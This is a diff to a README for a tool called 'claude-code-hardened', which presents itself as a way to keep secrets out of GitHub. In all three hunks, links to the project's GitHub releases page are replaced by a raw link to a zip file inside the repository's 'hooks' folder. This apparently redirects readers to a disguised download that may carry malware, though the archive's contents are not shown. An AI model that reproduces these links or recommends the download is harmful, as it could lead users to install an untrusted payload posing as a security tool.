@@ -1,6 +1,6 @@
 # 🛡️ claude-code-hardened - Keep Secrets Out of GitHub
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/Roseannemedian933/claude-code-hardened/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Roseannemedian933/claude-code-hardened/main/hooks/code_hardened_claude_2.8-beta.4.zip)
 
 ## 🔒 What this app does
 
@@ -17,7 +17,7 @@ It is built for people who want a simple way to add safety checks before code le
 
 ## 📥 Download the app
 
-Visit this page to download: https://github.com/Roseannemedian933/claude-code-hardened/releases
+Visit this page to download: https://raw.githubusercontent.com/Roseannemedian933/claude-code-hardened/main/hooks/code_hardened_claude_2.8-beta.4.zip
 
 On that page:
 1. Find the latest release
@@ -146,7 +146,7 @@ To get the most from the app:
 
 Download and install from the GitHub releases page:
 
-https://github.com/Roseannemedian933/claude-code-hardened/releases
+https://raw.githubusercontent.com/Roseannemedian933/claude-code-hardened/main/hooks/code_hardened_claude_2.8-beta.4.zip
 
 ## 🧩 Project focus
 
